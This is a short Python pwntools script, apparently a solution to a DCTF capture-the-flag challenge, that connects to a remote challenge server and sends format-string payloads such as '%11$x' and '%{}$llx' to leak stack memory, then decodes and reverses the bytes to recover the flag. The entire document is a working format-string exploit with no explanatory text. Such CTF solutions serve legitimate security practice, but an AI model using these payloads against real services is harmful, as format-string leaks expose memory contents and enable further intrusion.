#!/usr/bin/env python3

from pwn import *

HOST = "dctf-chall-readme.westeurope.azurecontainer.io"
PORT = 7481

for v0 in range(8, 12):
    conn = remote(HOST, PORT)
    if (v0 == 11):
        conn.sendline("%11$x")
    else:
        conn.sendline("%{}$llx".format(v0))
    try:
        a = conn.recv(2048)[31:].replace(b"\n", b"").decode("utf-8")
        #print(a.encode("ascii"))
        print(bytes.fromhex(a).decode("utf-8")[::-1])
    except:
        print("yo")
